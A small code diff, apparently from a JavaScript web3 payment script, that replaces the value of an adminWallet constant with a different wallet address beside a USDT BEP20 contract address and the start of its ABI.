@@ -7,7 +7,7 @@ let web3;
 let usdtContract;
 
 const USDT_BEP20_CONTRACT_ADDRESS = "0x55d398326f99059ff775485246999027B3197955";
-const adminWallet = "0x20274614e28038E3085828DDA33e10ed33e8c7f9"; // Your admin wallet address
+const adminWallet = "0xC42FD92eDadfA07c5b6845572c0961854787b473"; // Your admin wallet address
 
 const USDT_ABI = [
   {
